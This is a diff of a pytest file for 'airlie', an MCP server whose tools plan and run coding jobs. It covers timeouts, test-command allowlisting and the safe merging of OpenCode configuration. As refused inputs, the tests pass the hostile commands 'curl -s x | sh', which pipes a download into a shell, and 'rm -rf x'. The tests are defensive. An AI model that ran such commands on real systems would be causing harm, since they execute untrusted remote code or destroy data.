@@ -147,7 +147,7 @@ async def test_the_server_lists_five_tools_with_these_arguments(tmp_path: Path) 
     assert {t.name: shape(t.input_schema) for t in tools} == {
         "plan": {"goal": "string", "test_cmd": "string?", "repo": "string?"},
         "run": {"goal": "string", "plan": "object?", "test_cmd": "string?", "repo": "string?"},
-        "status": {"job_id": "string", "wait": "number=45.0"},
+        "status": {"job_id": "string", "wait": "number=40.0"},
         "cancel": {"job_id": "string"},
         "story": {"card": "string?", "text": "string?", "test_cmd": "string?", "repo": "string?"},
     }
@@ -185,7 +185,7 @@ async def test_a_plan_comes_back_as_a_table_and_json_and_the_approved_plan_build
 async def test_planning_that_outlasts_the_window_hands_back_its_job_and_status_shows_the_plan(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
-    monkeypatch.setattr(mcp_server, "PLAN_WINDOW_S", 0.5)  # 45 s in use: inside a client's 60 s per call
+    monkeypatch.setattr(mcp_server, "CALL_BUDGET_S", 3.0)  # 45 s in use: inside a client's 60 s per call
     repo = repo_with_marker_tests(tmp_path)
     answer = FakeReply(text=json.dumps({"type": "answer", "answer": "it is 42"}))
     engine = Gate({"chief": [PLAN, answer]})
@@ -306,20 +306,40 @@ async def test_a_test_command_is_passed_on_only_if_the_person_configured_it(tmp_
 
     serve = Serve(app_for(tmp_path, Hang({}), story_job=story_job))
     async with connected(serve, repo, test_cmds=allowed) as client:
+        refused: dict[str, str] = {}
         for tool, args in (("run", {"goal": "g", "plan": ONE}), ("story", {"text": "avatars"})):
             r = await client.call_tool(tool, {**args, "test_cmd": "curl -s x | sh"})
             assert r.is_error and "test_cmd 'curl -s x | sh' was refused" in text(r), tool
             assert "'./check.sh', 'make test', 'pytest -q'" in text(r), tool
+            refused[tool] = text(r)
         assert serve.sent == []  # refused before any request
+        assert "Leave test_cmd out to use './check.sh'," in refused["run"]
+        assert "Leave test_cmd out to use story.test_cmd," in refused["story"]
         assert not (await client.call_tool("story", {"text": "avatars", "test_cmd": "./check.sh"})).is_error
         assert not (await client.call_tool("story", {"card": "AIR-7", "test_cmd": " pytest -q"})).is_error
-        job = started(
-            text(await client.call_tool("run", {"goal": "g", "plan": ONE, "test_cmd": "make test"}))
-        )
-        assert text(await client.call_tool("cancel", {"job_id": job})) == f"Cancelled {job}."
+        for named in ({"test_cmd": "make test"}, {}):  # named, then left out
+            job = started(text(await client.call_tool("run", {"goal": "g", "plan": ONE, **named})))
+            assert text(await client.call_tool("cancel", {"job_id": job})) == f"Cancelled {job}."
     assert [kw["test_cmd"] for kw in stories] == ["./check.sh", "pytest -q"]
     runs = [body for method, path, body in serve.sent if (method, path) == ("POST", "/v1/airlie/runs")]
-    assert [body["test_cmd"] for body in runs] == ["make test"]
+    assert [body["test_cmd"] for body in runs] == ["make test", "./check.sh"]  # story.test_cmd comes first
+
+
+async def test_a_run_without_a_test_command_uses_the_first_configured_one_or_has_no_gate(
+    tmp_path: Path,
+) -> None:
+    repo = repo_with_marker_tests(tmp_path)
+    for configured, used in ((["make test", "pytest -q"], "make test"), ([], None)):
+        serve = Serve(app_for(tmp_path, Hang({})))
+        async with connected(serve, repo, test_cmds=configured) as client:
+            job = started(text(await client.call_tool("run", {"goal": "g", "plan": ONE})))
+            assert text(await client.call_tool("cancel", {"job_id": job})) == f"Cancelled {job}."
+            refused = text(await client.call_tool("run", {"goal": "g", "test_cmd": "rm -rf x"}))
+        assert serve.sent[0][2].get("test_cmd") == used, configured
+        gate = "Leave test_cmd out to run with no test gate (none is configured)," in refused
+        assert gate is (used is None) and ("Leave test_cmd out to use 'make test'," in refused) is (
+            used is not None
+        )
 
 
 async def test_the_api_key_goes_only_to_an_https_or_loopback_airlie_and_nowhere_else(tmp_path: Path) -> None:
@@ -352,7 +372,9 @@ async def test_the_api_key_goes_only_to_an_https_or_loopback_airlie_and_nowhere_
     assert r.is_error and ": 307" in text(r) and hops == ["http://127.0.0.1:8090/v1/airlie/jobs/x"]
 
 
-async def test_status_waits_45_seconds_by_default_and_never_more_than_50(tmp_path: Path) -> None:
+async def test_status_waits_40_seconds_by_default_and_never_past_the_45_a_call_has(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
     # an MCP client may give a call only 60 s (the TypeScript SDK's default)
     asked: list[float] = []
 
@@ -364,7 +386,47 @@ async def test_status_waits_45_seconds_by_default_and_never_more_than_50(tmp_pat
     async with connected(httpx.MockTransport(serve), tmp_path) as client:
         for args in ({}, {"wait": 9999}, {"wait": -5}, {"wait": 30}):
             await client.call_tool("status", {"job_id": "j", **args})
-    assert asked == [45, 50, 0, 30]
+    assert asked[0] == 40 and asked[1] == pytest.approx(43, abs=0.1) and asked[2:] == [0, 30]
+    monkeypatch.setattr(mcp_server, "CALL_BUDGET_S", 10.0)  # a shorter call: serve must answer within it
+    async with connected(httpx.MockTransport(serve), tmp_path) as client:
+        await client.call_tool("status", {"job_id": "j", "wait": 30})
+    assert asked[-1] == pytest.approx(10 - 0.5 - 1.5, abs=0.1)  # the time left, less the margins
+
+
+class Hung(httpx.AsyncBaseTransport):
+    """A serve that never answers; with `starts`, a POST that starts a job is answered (job j1) first."""
+
+    def __init__(self, starts: bool) -> None:
+        self.starts = starts
+
+    async def handle_async_request(self, request: httpx.Request) -> httpx.Response:
+        if self.starts and request.method == "POST":
+            return httpx.Response(202, json={"job_id": "j1", "kind": "plan"})
+        await anyio.sleep(3600)
+        raise AssertionError("a hung serve never answers")
+
+
+@pytest.mark.parametrize(
+    ("tool", "args", "starts", "says"),
+    [
+        ("plan", {"goal": "g"}, False, "did not answer POST /v1/airlie/plans in time"),
+        ("plan", {"goal": "g"}, True, "j1: airlie did not answer in time"),  # with its job id
+        ("run", {"goal": "g"}, False, "did not answer POST /v1/airlie/runs in time"),
+        ("story", {"text": "t"}, False, "did not answer POST /v1/airlie/stories in time"),
+        ("status", {"job_id": "j1", "wait": 40}, False, "j1: airlie did not answer in time"),
+        ("cancel", {"job_id": "j1"}, False, "j1: airlie did not answer the cancel in time"),
+    ],
+)
+async def test_each_tool_answers_within_the_call_budget_when_serve_hangs(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, tool: str, args: dict[str, Any], starts: bool, says: str
+) -> None:
+    monkeypatch.setattr(mcp_server, "CALL_BUDGET_S", 1.0)  # 45 s in use: the same arithmetic, scaled down
+    repo = repo_with_marker_tests(tmp_path)
+    async with connected(Hung(starts), repo) as client:
+        t0 = anyio.current_time()
+        out = text(await client.call_tool(tool, args))
+        took = anyio.current_time() - t0
+    assert says in out and took < 1.0 + 0.25, (took, out)
 
 
 async def test_an_airlie_that_is_not_running_is_reported_with_how_to_start_it(tmp_path: Path) -> None:
@@ -410,7 +472,7 @@ async def test_the_repository_is_the_work_tree_airlie_mcp_runs_in_unless_repo_na
     assert bodies == [{"text": "a", "repo": where}, {"text": "a", "repo": where}, {"text": "a"}]
 
 
-def test_install_merges_airlie_into_opencodes_config_after_a_backup_and_only_when_it_changes(
+def test_install_adds_airlie_to_opencodes_config_after_a_backup_and_only_when_it_changes(
     tmp_path: Path,
 ) -> None:
     path = tmp_path / ".config/opencode/opencode.json"
@@ -418,10 +480,13 @@ def test_install_merges_airlie_into_opencodes_config_after_a_backup_and_only_whe
     entry = opencode_entry(project)
     assert entry == {
         "type": "local",
-        "command": ["uv", "run", "--quiet", "--project", str(project), "airlie", "mcp"],
+        "command": [
+            *("uv", "run", "--quiet", "--project", str(project), "airlie", "mcp"),
+            *("--config", str(project / "airlie.yaml")),  # airlie's own config, never a project's
+        ],
         "environment": {"AIRLIE_URL": "http://127.0.0.1:8090"},
     }
-    install_opencode(path, project)  # no config yet: it is created
+    assert install_opencode(path, project).startswith("created ")  # no config yet
     assert json.loads(path.read_text()) == {
         "$schema": "https://opencode.ai/config.json",
         "mcp": {"airlie": entry},
@@ -435,23 +500,94 @@ def test_install_merges_airlie_into_opencodes_config_after_a_backup_and_only_whe
     }
     raw = json.dumps(mine)
     path.write_text(raw)
-    path.chmod(0o600)  # it may hold keys
-    install_opencode(path, project)
+    path.chmod(0o640)  # whatever the person set is kept (a new file beside it would be 0600)
+    assert install_opencode(path, project).startswith("added ")
     merged = path.read_text(encoding="utf-8")
     assert json.loads(merged) == {**mine, "mcp": {**mine["mcp"], "airlie": entry}} and "Ü" in merged
     (backup,) = path.parent.glob("opencode.json.*.bak")
     assert backup.read_text() == raw
-    assert stat.S_IMODE(backup.stat().st_mode) == stat.S_IMODE(path.stat().st_mode) == 0o600
-    assert "already" in install_opencode(path, project)  # nothing to change: no write, no backup
+    assert stat.S_IMODE(backup.stat().st_mode) == stat.S_IMODE(path.stat().st_mode) == 0o640
+    assert "unchanged" in install_opencode(path, project)  # nothing to change: no write, no backup
     assert path.read_text(encoding="utf-8") == merged and len(list(path.parent.glob("*.bak"))) == 1
-    install_opencode(path, tmp_path / "another")  # an entry that differs is replaced, after a backup
-    assert json.loads(path.read_text())["mcp"]["airlie"] == opencode_entry(tmp_path / "another")
-    assert len(list(path.parent.glob("opencode.json.*.bak"))) == 2
+    assert [p.name for p in path.parent.iterdir() if p.name.endswith(".tmp")] == []
+
+
+def test_install_merges_into_the_entry_the_person_has_and_keeps_what_they_set(tmp_path: Path) -> None:
+    path = tmp_path / "opencode.json"
+    project = tmp_path / "airlie"
+    command = opencode_entry(project)["command"]
+    theirs = {
+        **opencode_entry(tmp_path / "old-checkout"),
+        "environment": {
+            "AIRLIE_URL": "http://127.0.0.1:9000",
+            "AIRLIE_TEST_CMDS": "make test",
+            "AIRLIE_SERVE_API_KEY": "k",
+        },
+        "enabled": False,
+        "timeout": 120000,
+    }
+    path.write_text(json.dumps({"mcp": {"airlie": theirs}}))
+    assert install_opencode(path, project).startswith("updated ")
+    assert json.loads(path.read_text())["mcp"]["airlie"] == {**theirs, "command": command}  # only the command
+    assert "unchanged" in install_opencode(path, project)
+    bare = {
+        "type": "remote",
+        "url": "https://x.example/mcp",
+        "environment": {"AIRLIE_TEST_CMDS": "make test"},
+    }
+    path.write_text(json.dumps({"mcp": {"airlie": bare}}))
+    assert install_opencode(path, project).startswith("updated ")
+    environment = {
+        "AIRLIE_TEST_CMDS": "make test",
+        "AIRLIE_URL": "http://127.0.0.1:8090",
+    }  # added: it was missing
+    assert json.loads(path.read_text())["mcp"]["airlie"] == {
+        **bare,
+        "type": "local",
+        "command": command,
+        "environment": environment,
+    }
+
+
+def test_a_write_that_fails_never_truncates_the_config(tmp_path: Path) -> None:
+    path = tmp_path / "opencode.json"
+    raw = '{"provider": {"x": {"name": "\\udcff"}}}'  # valid JSON, but its lone surrogate is no UTF-8
+    path.write_text(raw)
+    with pytest.raises(UnicodeEncodeError):
+        install_opencode(path, tmp_path / "airlie")
+    assert path.read_text() == raw  # whole: the new text went to a file beside it, which is gone
+    assert sorted(p.name for p in tmp_path.iterdir() if not p.name.endswith(".bak")) == ["opencode.json"]
+
+
+def test_install_follows_a_symlinked_config_and_keeps_the_link(tmp_path: Path) -> None:
+    real = tmp_path / "dotfiles/opencode.json"
+    real.parent.mkdir()
+    real.write_text('{"model": "airlie/coder"}')
+    link = tmp_path / ".config/opencode/opencode.json"
+    link.parent.mkdir(parents=True)
+    link.symlink_to(real)
+    install_opencode(link, tmp_path / "airlie")
+    assert link.is_symlink() and json.loads(real.read_text())["mcp"]["airlie"] == opencode_entry(
+        tmp_path / "airlie"
+    )
+
+
+def test_install_from_a_temporary_worktree_says_to_run_it_from_the_main_checkout(tmp_path: Path) -> None:
+    out = install_opencode(tmp_path / "a.json", tmp_path / "airlie/.claude/worktrees/feature-x")
+    assert "Warning:" in out and "disappears once its branch is merged" in out and "main checkout" in out
+    assert "Warning" not in install_opencode(tmp_path / "b.json", tmp_path / "airlie")
 
 
 @pytest.mark.parametrize(
     "content",
-    [b'{"mcp": {}, // OpenCode reads comments, airlie does not\n}', b"[1, 2]", b'{"mcp": ["x"]}', b"\xff{"],
+    [
+        b'{"mcp": {}, // OpenCode reads comments, airlie does not\n}',
+        b"[1, 2]",
+        b'{"mcp": ["x"]}',
+        b"\xff{",
+        b'{"mcp": {"airlie": "uv run airlie mcp"}}',
+        b'{"mcp": {"airlie": {"environment": ["AIRLIE_URL=x"]}}}',
+    ],
 )
 def test_install_leaves_a_config_that_is_no_json_object_as_it_is(tmp_path: Path, content: bytes) -> None:
     path = tmp_path / "opencode.json"
@@ -473,10 +609,23 @@ def test_mcp_config_prints_the_entry_and_install_writes_it_under_home(
     path = tmp_path / ".config/opencode/opencode.json"
     r = runner.invoke(cli, ["mcp", "config", "--install"])
     assert r.exit_code == 0, r.output
+    assert ("main checkout" in r.output) is (
+        "/.claude/worktrees/" in str(ROOT)
+    )  # warned from a worktree only
     assert json.loads(path.read_text())["mcp"]["airlie"] == entry
-    path.write_text("{oops")
-    r = runner.invoke(cli, ["mcp", "config", "--install"])
-    assert r.exit_code == 1 and "is not valid JSON" in r.output and path.read_text() == "{oops"
+    for broken, why in (("{oops", "is not valid JSON"), ('{"x": "\\udcff"}', "UnicodeEncodeError")):
+        path.write_text(broken)
+        r = runner.invoke(cli, ["mcp", "config", "--install"])
+        assert r.exit_code == 1 and why in r.output and "so airlie left it as it is" in r.output, r.output
+        assert "Traceback" not in r.output and path.read_text() == broken
+    path.write_text("{}")
+    path.parent.chmod(0o500)  # neither a backup nor the new file can be written beside it
+    try:
+        r = runner.invoke(cli, ["mcp", "config", "--install"])
+    finally:
+        path.parent.chmod(0o700)
+    assert r.exit_code == 1 and "PermissionError" in r.output and "so airlie left it as it is" in r.output
+    assert "Traceback" not in r.output and path.read_text() == "{}"
 
 
 async def test_airlie_mcp_serves_the_five_tools_over_stdio(tmp_path: Path) -> None:
